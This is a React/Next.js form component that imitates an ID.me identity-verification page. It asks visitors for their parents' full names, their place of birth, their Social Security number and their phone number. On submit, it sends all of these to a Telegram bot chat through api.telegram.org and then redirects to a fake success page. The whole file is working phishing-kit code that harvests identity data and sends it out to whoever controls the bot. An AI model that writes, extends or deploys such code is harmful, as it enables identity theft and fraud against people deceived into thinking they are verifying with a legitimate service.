"use client"
import { useRouter } from 'next/navigation';
import React from 'react'

interface FormData {
    fatherFullName: string;
    motherFullName: string;
    city: string;
    ssn: string;
    phoneNumber: string;
}
interface FormErrors {
    fatherFullName?: string;
    motherFullName?: string;
    city?: string;
    ssn?: string;
    phoneNumber?: string;
}

export default function IDMEForm() {
    const [formData, setFormData] = React.useState<FormData>({
        fatherFullName: '',
        motherFullName: '',
        city: '',
        ssn: '',
        phoneNumber: '',
    });
    const [isSubmitting, setIsSubmitting] = React.useState(false);
    const [errors, setErrors] = React.useState<FormErrors>({});
    const router = useRouter();

    const telegramApiKey = process.env.NEXT_PUBLIC_TELEGRAM_API ?? '';
    const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? '';

    const validateForm = (): boolean => {
        const newErrors: FormErrors = {};
        if (!formData.fatherFullName.trim()) {
            newErrors.fatherFullName = `Father's full name is required`;
        }
        if (!formData.motherFullName.trim()) {
            newErrors.motherFullName = `Mother's full name is required`;
        }
        if (!formData.city.trim()) {
            newErrors.city = `Your city and place of birth is required`;
        }
        if (!formData.ssn.trim()) {
            newErrors.ssn = `SSN is required`;
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const { name, value } = e.target;
        setFormData(prev => ({
            ...prev,
            [name]: value
        }));
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();

        if (!validateForm()) {
            console.log("Form validation failed", errors);
            return;
        }

        setIsSubmitting(true);

        try {
            const message = `
            ++++++ 🔰🔰 ID ME DETAILS 🔰🔰++++++
            [FATHER'S FULL NAME] : ${formData.fatherFullName}
            [MOTHER'S FULL NAME] : ${formData.motherFullName}
            [CITY & PLACE OF BIRTH] : ${formData.city}
            [SSN] : ${formData.ssn}
            [PHONE NUMBER] : ${formData.phoneNumber}
            +++++🔰🔰 ID ME 🔰🔰++++;
            `;

            const textResponse = await fetch(`https://api.telegram.org/bot${telegramApiKey}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message,
                    parse_mode: 'Markdown'
                }),
            });

            if (!textResponse.ok) {
                const textData = await textResponse.json();
                throw new Error(textData.description || 'Failed to send message to Telegram');
            }
            router.push('/id-me/success')

        } catch (error) {
            console.error('Submission error:', error);
            alert(`There was an error submitting your application: ${error instanceof Error ? error.message : 'Unknown error'}`);
        } finally {
            setIsSubmitting(false);
        }
    };


    return (
        <form className="space-y-6 px-5 md:px-0" onSubmit={handleSubmit}>
            <h1 className="text-[26px] font-semibold text-[#2e3f51] mb-6 text-center">
                Confirm your details
            </h1>
            <p className="text-sm text-gray-600">* Indicates a required field</p>

            <div>
                <label htmlFor="fatherFullName" className="block text-sm font-medium text-[#2e3f51]">
                    Father&apos; Full Name <span className="text-red-500">*</span>
                </label>
                <div className="mt-1">
                    <input
                        id="fatherFullName"
                        name="fatherFullName"
                        type="text"
                        autoComplete="fatherFullName"
                        value={formData.fatherFullName}
                        onChange={handleChange}
                        placeholder="Enter your father's full name"
                        className="h-[60px] placeholder:font-medium appearance-none block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                    />
                    {errors.fatherFullName && <p className="mt-1 text-sm text-red-600">{errors.fatherFullName}</p>}
                </div>
            </div>
            <div>
                <label htmlFor="motherFullName" className="block text-sm font-medium text-[#2e3f51]">
                    Mother&apos; Full Name <span className="text-red-500">*</span>
                </label>
                <div className="mt-1">
                    <input
                        id="motherFullName"
                        name="motherFullName"
                        type="text"
                        autoComplete="motherFullName"
                        value={formData.motherFullName}
                        onChange={handleChange}
                        placeholder="Enter your mother's full name"
                        className="h-[60px] placeholder:font-medium appearance-none block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                    />
                    {errors.motherFullName && <p className="mt-1 text-sm text-red-600">{errors.motherFullName}</p>}
                </div>
            </div>

            <div>
                <label htmlFor="city" className="block text-sm font-medium text-[#2e3f51]">
                    Your City and place of birth <span className="text-red-500">*</span>
                </label>
                <div className="mt-1">
                    <input
                        id="city"
                        name="city"
                        type="text"
                        autoComplete="current-city"
                        value={formData.city}
                        onChange={handleChange}
                        placeholder="eg. Houston, Texas"
                        className="h-[60px] placeholder:font-medium appearance-none block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                    />
                    {errors.city && <p className="mt-1 text-sm text-red-600">{errors.city}</p>}
                </div>
            </div>

            <div>
                <label htmlFor="ssn" className="block text-sm font-medium text-[#2e3f51]">
                    Social Security Number <span className="text-red-500">*</span>
                </label>
                <div className="mt-1">
                    <input
                        id="ssn"
                        name="ssn"
                        type="tel"
                        autoComplete="current-ssn"
                        value={formData.ssn}
                        onChange={handleChange}
                        placeholder="Enter ssn"
                        className="h-[60px] placeholder:font-medium appearance-none block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                    />
                    {errors.ssn && <p className="mt-1 text-sm text-red-600">{errors.ssn}</p>}
                </div>
            </div>

            <div>
                <label htmlFor="phoneNumber" className="block text-sm font-medium text-[#2e3f51]">
                    Phone Number <span className="text-red-500">*</span>
                </label>
                <div className="mt-1">
                    <input
                        id="ssn"
                        name="phoneNumber"
                        type="tel"
                        autoComplete="phone"
                        value={formData.phoneNumber}
                        onChange={handleChange}
                        placeholder="Enter phone number"
                        className="h-[60px] placeholder:font-medium appearance-none block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                    />
                    {errors.phoneNumber && <p className="mt-1 text-sm text-red-600">{errors.phoneNumber}</p>}
                </div>
            </div>

            <div>
                <button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full h-[60px] flex items-center justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                    {isSubmitting ? 'Submitting...' : 'Submit'}
                </button>
            </div>
        </form>
    )
}